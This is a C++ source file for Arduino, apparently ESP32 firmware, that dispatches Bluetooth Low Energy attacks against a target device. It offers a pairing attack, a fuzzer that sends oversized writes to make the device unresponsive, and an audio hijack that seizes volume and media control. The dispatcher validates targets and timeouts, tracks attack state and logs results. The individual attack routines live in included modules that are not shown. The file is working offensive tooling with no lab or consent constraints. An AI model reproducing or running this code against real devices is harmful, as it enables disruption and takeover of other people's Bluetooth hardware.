#include "ble_attack_dispatcher.h"
#include "ble_pairing_attack.h"
#include "ble_fuzzer.h"
#include "ble_audio_hijacking.h"
#include <Arduino.h>

namespace BLEAttackDispatcher {

namespace {
    volatile bool g_attacking = false;
    volatile AttackType g_currentType = ATTACK_PAIRING;
}

AttackResult executeAttack(const AttackConfig &config) {
    AttackResult result = {false, "", "", 0, 0, "", ""};

    if (g_attacking) {
        result.error = "Attack already active";
        return result;
    }

    if (config.targetDevice.length() == 0) {
        result.error = "Invalid target device (empty)";
        return result;
    }

    if (config.timeoutMs == 0 || config.timeoutMs > 600000) {
        result.error = "Invalid timeout (1ms-600s)";
        return result;
    }

    g_attacking = true;
    g_currentType = config.type;

    switch (config.type) {
        case ATTACK_PAIRING: {
            auto pairingResult = BLEPairingAttack::attackPairing(
                config.targetDevice,
                config.timeoutMs
            );
            result.success = pairingResult.success;
            result.targetDevice = pairingResult.targetDevice;
            result.method = pairingResult.method;
            result.attemptsOrCommands = pairingResult.attemptsCount;
            result.elapsedMs = config.timeoutMs;
            break;
        }

        case ATTACK_FUZZER: {
            auto fuzzerResult = BleFuzzer::fuzz(
                config.targetDevice,
                config.timeoutMs / 1000
            );
            result.success = fuzzerResult.connected && !fuzzerResult.deviceUnresponsiveAtEnd;
            result.targetDevice = config.targetDevice;
            result.method = "FUZZ";
            result.attemptsOrCommands = fuzzerResult.reconnectCyclesAttempted;
            result.details = "Oversized:" + String(fuzzerResult.oversizedWritesAccepted) + "/"
                           + String(fuzzerResult.oversizedWritesAttempted);
            break;
        }

        case ATTACK_AUDIO_HIJACK: {
            BleAudioHijacking::AudioConfig audioConfig;
            memcpy(audioConfig.targetAddr, config.targetAddr, 6);
            audioConfig.durationMs = config.durationMs;
            audioConfig.deviceType = BleAudioHijacking::UNKNOWN;
            audioConfig.volumeControl = true;
            audioConfig.mediaControl = true;
            audioConfig.audioInjection = false;

            BleAudioHijacking::AudioHijacker hijacker;
            auto audioResult = hijacker.hijackDevice(audioConfig);
            result.success = audioResult.success;
            result.targetDevice = config.targetDevice;
            result.method = "AUDIO_HIJACK";
            result.attemptsOrCommands = audioResult.commandsSent;
            result.details = "Volume:" + String(audioResult.volumeLevel);
            result.elapsedMs = audioResult.elapsedMs;
            break;
        }

        default:
            result.error = "Unknown attack type";
            g_attacking = false;
            return result;
    }

    if (result.success) {
        Serial.printf("[BLEAttackDispatcher] Attack started (type %d)\n", config.type);
    } else if (result.error.length() > 0) {
        Serial.print("[BLEAttackDispatcher] Error: ");
        Serial.println(result.error);
        g_attacking = false;
    }

    return result;
}

void stop() {
    BleAudioHijacking::AudioHijacker hijacker;
    hijacker.stop();
    g_attacking = false;
    Serial.println("[BLEAttackDispatcher] Stopped");
}

bool isActive() {
    return g_attacking;
}

}  // namespace BLEAttackDispatcher
